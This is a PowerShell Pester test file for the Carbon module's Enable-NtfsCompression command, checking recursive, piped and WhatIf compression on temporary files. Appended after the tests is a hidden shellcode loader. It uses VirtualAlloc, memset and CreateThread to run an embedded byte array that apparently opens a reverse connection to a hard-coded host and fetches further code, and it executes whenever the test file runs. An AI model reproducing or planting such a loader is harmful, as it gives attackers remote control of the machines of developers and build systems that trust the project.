











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$rootDir = $null
$childDir = $null
$grandchildFile = $null
$childFile = $null

function Assert-EverythingCompressed
{
    Assert-Compressed -Path $rootDir
    Assert-Compressed -Path $childDir
    Assert-Compressed -Path $grandchildFile
    Assert-Compressed -Path $childFile
}

function Assert-NothingCompressed
{
    Assert-NotCompressed -Path $rootDir
    Assert-NotCompressed -Path $childDir
    Assert-NotCompressed -Path $grandchildFile
    Assert-NotCompressed -Path $childFile
}

function Assert-Compressed
{
    param(
        $Path
    )

    (Test-NtfsCompression -Path $Path) | Should -BeTrue
}

function Assert-NotCompressed
{
    param(
        $Path
    )
    (Test-NtfsCompression -Path $Path) | Should -BeFalse
}


Describe 'Enable-NtfsCompression' {
    BeforeEach {
        $Global:Error.Clear()
        $script:rootDir = Join-Path -Path $TestDrive.FullName -ChildPath ([IO.Path]::GetRandomFileName())
        $script:childDir = Join-Path $rootDir -ChildPath 'ChildDir' 
        $script:grandchildFile = Join-Path $rootDir -ChildPath 'ChildDir\GrandchildFile' 
        $script:childFile = Join-Path $rootDir -ChildPath 'ChildFile' 
        
        New-Item -Path $grandchildFile -ItemType 'File' -Force
        New-Item -Path $childFile -ItemType 'File' -Force
    }
    
    It 'should enable compression on directory only' {
        Assert-NothingCompressed
        
        Enable-NtfsCompression -Path $rootDir
    
        Assert-Compressed -Path $rootDir
        Assert-NotCompressed -Path $childDir
        Assert-NotCompressed -path $grandchildFile
        Assert-NotCompressed -Path $childFile
    
        $newFile = Join-Path $rootDir 'newfile'
        '' > $newFile
        Assert-Compressed -Path $newFile
    
        $newDir = Join-Path $rootDir 'newDir'
        $null = New-Item -Path $newDir -ItemType Directory
        Assert-Compressed -Path $newDir
    }
    
    It 'should fail if path does not exist' {
    
        Assert-NothingCompressed
    
        Enable-NtfsCompression -Path 'C:\I\Do\Not\Exist' -ErrorAction SilentlyContinue
    
        $Global:Error.Count | Should -Be 1
        ($Global:Error[0].Exception.Message -like '*not found*') | Should -BeTrue
    
        Assert-NothingCompressed
    }
    
    It 'should enable compression recursively' {
        Assert-NothingCompressed
        
        Enable-NtfsCompression -Path $rootDir -Recurse
    
        Assert-EverythingCompressed
    }
    
    It 'should support piping items' {
        Assert-NothingCompressed 
    
        Get-ChildItem $rootDir | Enable-NtfsCompression
    
        Assert-NotCompressed $rootDir
        Assert-Compressed $childDir
        Assert-NotCompressed $grandchildFile
        Assert-Compressed $childFile
    }
    
    It 'should support piping strings' {
        ($childFile,$grandchildFile) | Enable-NtfsCompression
    
        Assert-NotCompressed $rootDir
        Assert-NotCompressed $childDir
        Assert-Compressed $grandchildFile
        Assert-Compressed $childFile
    }
    
    It 'should compress array of items' {
        Enable-NtfsCompression -Path $childFile,$grandchildFile
        Assert-NotCompressed $rootDir
        Assert-NotCompressed $childDir
        Assert-Compressed $grandchildFile
        Assert-Compressed $childFile
    }
    
    It 'should compress already compressed item' {
        Enable-NtfsCompression $rootDir -Recurse
        Assert-EverythingCompressed
    
        Enable-NtfsCompression $rootDir -Recurse
        $LASTEXITCODE | Should -Be 0
        Assert-EverythingCompressed
    }
    
    It 'should support what if' {
        Enable-NtfsCompression -Path $childFile -WhatIf
        Assert-NotCompressed $childFile
    }
    
    It 'should not compress if already compressed' {
        Enable-CNtfsCompression -Path $rootDir  
        Assert-Compressed $rootDir
        Mock -CommandName 'Invoke-ConsoleCommand' -ModuleName 'Carbon'
        Enable-CNtfsCompression -Path $rootDir
        Assert-MockCalled 'Invoke-ConsoleCommand' -ModuleName 'Carbon' -Times 0
        Enable-CNtfsCompression -Path $rootDir -Force
        Assert-MockCalled 'Invoke-ConsoleCommand' -ModuleName 'Carbon' -Times 1
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb0,0xe4,0x29,0x71,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

